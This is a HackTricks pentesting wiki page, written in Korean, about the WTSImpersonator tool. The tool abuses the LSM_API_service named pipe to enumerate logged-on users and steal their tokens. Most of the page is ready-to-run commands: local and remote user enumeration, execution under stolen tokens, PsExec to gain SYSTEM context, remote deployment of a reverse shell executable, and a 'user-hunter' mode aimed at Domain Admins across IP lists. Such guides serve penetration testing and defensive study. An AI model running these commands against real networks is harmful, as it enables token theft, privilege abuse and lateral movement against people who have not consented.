# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTS Impersonator** tool은 **"\\pipe\LSM_API_service"** RPC Named pipe를 악용하여 로그인한 사용자를 은밀하게 열거하고 해당 사용자의 토큰을 탈취함으로써 기존 Token Impersonation 기법을 우회합니다. 이 접근 방식은 네트워크 내에서 원활한 lateral movement를 가능하게 합니다. 이 기법의 혁신은 **Omri Baso**의 공로이며, 그의 작업은 [GitHub](https://github.com/OmriBaso/WTSImpersonator)에서 확인할 수 있습니다.<sup>[[1]](#references)</sup>

### Core Functionality

이 tool은 일련의 API 호출을 통해 동작합니다:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### 주요 Modules 및 사용법

- **Users 열거**: 이 tool을 사용하면 Local 및 remote user 열거가 가능하며, 각 상황에 맞는 command를 사용할 수 있습니다:

- Locally:
```bash
.\WTSImpersonator.exe -m enum
```
- IP address 또는 hostname을 지정하여 Remotely:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Commands 실행**: `exec` 및 `exec-remote` modules가 작동하려면 **Service** context가 필요합니다. Local execution에는 WTSImpersonator executable과 command만 필요합니다:

- Local command execution 예시:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Service context를 얻기 위해 PsExec64.exe를 사용할 수 있습니다:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**: PsExec.exe와 유사하게 remote에서 service를 생성하고 install하여, 적절한 permissions으로 execution할 수 있습니다.

- Remote execution 예시:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: 여러 machines에서 특정 users를 대상으로 하며, 해당 users의 credentials로 code를 실행합니다. 이는 여러 systems에서 local admin rights를 보유한 Domain Admins를 targeting할 때 특히 유용합니다.
- 사용 예시:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
